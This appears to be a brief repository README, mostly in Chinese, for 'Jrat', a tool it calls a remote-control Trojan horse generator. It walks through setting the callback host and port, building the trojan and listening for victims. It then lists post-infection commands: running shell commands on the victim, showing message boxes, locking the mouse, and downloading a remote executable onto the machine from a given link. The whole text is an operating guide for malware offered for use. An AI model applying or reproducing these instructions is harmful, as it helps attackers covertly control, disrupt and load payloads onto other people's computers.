#&nbsp;Jrat
Jrat&nbsp;is&nbsp;a&nbsp;remote&nbsp;control&nbsp;Trojan&nbsp;horse&nbsp;generator.<br>
使用方法：<br>
在“Jrat>>”阶段可用的命令有：lhost（上线IP），lport（上线端口），port（监听端口），save（生成木马），run（开始监听）<br>
例如：Jrat>>&nbsp;lhost&nbsp;127.0.0.1&nbsp;&nbsp;&nbsp;&nbsp;Jrat>>&nbsp;lport&nbsp;8808&nbsp;&nbsp;&nbsp;&nbsp;Jrat>>&nbsp;port&nbsp;8808&nbsp;&nbsp;&nbsp;&nbsp;Jrat>>&nbsp;save&nbsp;&nbsp;&nbsp;&nbsp;Jrat>>&nbsp;run<br>
以上步骤是生成一个连接到127.0.0.1，端口为8808的木马，然后开始监听8808端口并等待木马上线<br>
木马上线后，程序来到第二阶段“Command>>”阶段，此阶段中可用的命令有：shell+cmd命令，msgbox+提示信息，clip+true/false（锁定/解锁鼠标），download+link+name（远程下载文件）<br>
例如：Command>>&nbsp;shell&nbsp;start&nbsp;C:&nbsp;&nbsp;&nbsp;&nbsp;Command>>&nbsp;msgbox&nbsp;Hello&nbsp;World!&nbsp;&nbsp;&nbsp;&nbsp;Command>>&nbsp;clip&nbsp;true&nbsp;&nbsp;&nbsp;&nbsp;Command>>&nbsp;download&nbsp;http://baidu.com/1.exe &nbsp; 1.exe<br>
上述命令时，先打开C盘，然后弹出一个对话窗口，显示“Hello&nbsp;World!”，接着鼠标被锁住，最后远程下载一个链接为“http://baidu.com/1.exe”的文件<br>
